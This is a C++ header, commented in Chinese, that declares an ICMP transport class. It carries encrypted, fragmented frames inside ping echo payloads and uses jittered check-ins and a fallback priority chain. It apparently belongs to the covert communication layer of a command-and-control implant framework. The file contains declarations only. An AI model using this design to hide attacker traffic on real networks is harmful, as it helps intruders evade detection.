// Core/Comms/Transports/Icmp/IcmpTransport.hpp
// ICMP 传输(Phase 3, 低带宽通道):
// 交互模型与 DNS 相同(数据报/回声): Send 加密分片入队(≤1400B),
// Recv 节流后取一片发起 echo, 应答 payload 带回下行分片, 重组解密还原帧。
// 平台: Windows IcmpSendEcho(免管理员); Linux ping socket 延后。
#pragma once

#include <atomic>
#include <cstdint>
#include <deque>
#include <memory>
#include <mutex>
#include <string>
#include <vector>

#include "Core/Comms/Transports/ITransport.hpp"
#include "Core/Comms/Transports/Internal/PollClock.hpp"
#include "Core/Comms/Session/HeartbeatPolicy.hpp"
#include "Core/Comms/Transports/Internal/DatagramCodec.hpp"
#include "Core/Comms/Transports/Icmp/IcmpOps.hpp"

namespace cleat {

	class IcmpTransport : public ITransport {
	public:
		explicit IcmpTransport(std::unique_ptr<IIcmpOps> icmp);
		~IcmpTransport() override;

		IcmpTransport(const IcmpTransport&) = delete;
		IcmpTransport& operator=(const IcmpTransport&) = delete;
		IcmpTransport(IcmpTransport&&) = delete;
		IcmpTransport& operator=(IcmpTransport&&) = delete;

		bool Connect(const TransportConfig& cfg) override;
		void Disconnect() override;
				bool IsConnected() const override;
		
		/**
		 * @brief 通道健康档
		 * @details Dead <=> `connected_ == false`(B.1 原则 2); Degraded 由今天"不判死"的
		 */
		ChannelHealth HealthNow() const override;
		bool Send(const std::vector<uint8_t>& frame) override;
		/**
		 * @brief 覆写 ITransport 默认映射: 结构性超限报 `Dropped`
		 * @details 与 DnsTransport::Write 同因同法: 整帧分片超 255 是**永久**失败,
		 *          报 `Rejected` 会被 OutboundSink 回插队首永久卡死出站队列;
		 *          其余 false(上行队列余量不足等)维持 `Rejected`(可重试)。
		 *          两者都不是 `ChannelFailure`(C5 硬约束不受影响)。
		 */
		SendResult Write(const std::vector<uint8_t>& frame) override;
		bool Recv(std::vector<uint8_t>& frame, int timeout_ms) override;
		///  取走并复位上行积压统计(自上次调用以来的增量)
		ChannelOverflowStats TakeOverflowStats() override;

		TransportType Type() const override { return TransportType::Icmp; }

		/// v1.5 节奏合一(设计): 距下一次 check-in 到期, 空闲档为准 ——
		/// 快速档(未注册/上行积压)条件与掩码前提互斥(判定层已拒), 不参与窗长推导。
		uint32_t NextPollDueInMs() const override { return slow_clock_.NextDueInMs(); }

		/// v1.5 收尾(稳态掩码门): 待落线上行分片字节 —— sink 排空 ≠ 干完,
		/// 分片要多次 Recv 才逐片落线, 未排空不进窗。
		uint32_t PendingUplinkBytes() const override {
			std::lock_guard<std::mutex> lock(mutex_);
			uint64_t bytes = 0;
			for (const std::vector<uint8_t>& f : up_frags_) {
				bytes += f.size();
			}
			return static_cast<uint32_t>(bytes > UINT32_MAX ? UINT32_MAX : bytes);
		}
		int Priority() const override { return 3; }   // 降级链: 最后
		void Reset() override;

	private:
		bool do_echo(const std::vector<uint8_t>& up_frag, std::vector<uint8_t>& down_frag);

		std::unique_ptr<IIcmpOps> icmp_;
		TransportConfig cfg_;
		std::atomic<bool> connected_{ false };
		
				/// Degraded 信号位
		std::atomic<bool> degraded_{ false };
		void MarkDegraded(const char* why);
		
		/// N23: 连续下行解密失败熔断 —— 阈值按通道定值
		/// (低带宽通道走 UDP, 偶发损坏/伪造概率高于 TLS 承载的 HTTPS, 故容错度更高)
		static constexpr int kDecryptFailThreshold = 5;
		int decrypt_fail_streak_ = 0;
		void NoteDecryptFailure();   ///< 记一次失败: Degraded, 达阈值判 Dead
		void NoteDecryptSuccess();   ///< 解密成功: 清零并清除 Degraded

		void ClearDegraded() { degraded_.store(false); }
		mutable std::mutex mutex_;   // mutable: PendingUplinkBytes() const 需持锁只读

		HeartbeatPolicy clock_policy_;                // 唯一抖动模型(节拍合一 A1.5)
		PollClock slow_clock_{ clock_policy_, 1000 }; // 空闲 check-in(心跳节奏, 正态/均匀+丢拍)
		PollClock fast_clock_{ clock_policy_, 1000 }; // 有上行数据/未注册时: 1s 快速交互(固定, 不抖不丢)

		std::deque<std::vector<uint8_t>> up_frags_;
		/// 本次 Send 是否因结构性超限(整帧 > 255 片)失败 —— Write 据此报 Dropped
		/// 而非 Rejected(见 Write 注; 与 DnsTransport::send_structural_ 同义)。
		std::atomic<bool> send_structural_{ false };
		ChannelOverflowStats overflow_;   ///<  溢出聚合(取走后复位)   // 上行分片队列(有界)
		DatagramCodec::Reassembler reassembler_;
		std::vector<uint8_t> pending_frame_;          // 探活返回的完整帧缓存
	};

	// 工厂(声明见 ITransport.hpp)
	std::unique_ptr<ITransport> CreateIcmpTransport();

} // namespace cleat
